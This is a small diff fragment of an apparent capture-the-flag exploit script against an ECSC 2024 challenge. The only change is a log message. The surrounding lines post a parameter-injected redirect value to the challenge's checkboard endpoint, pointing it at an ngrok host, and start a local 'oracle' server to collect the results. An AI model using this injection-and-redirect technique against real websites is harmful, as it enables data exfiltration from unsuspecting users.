@@ -508,7 +508,7 @@ if __name__ == '__main__':
         requests.post("https://gosweeper.challs.open.ecsc2024.it/checkboard", data={"cloneid":"&redirect=//3013-87-21-109-73.ngrok-free.app/pwn"}, headers=headers)
 
         try:
-            print("[*] Started Oracle")
+            print("[*] Starting Oracle")
             app.run(port=5000)
         except KeyboardInterrupt:
             print("[*] Closing oracle")
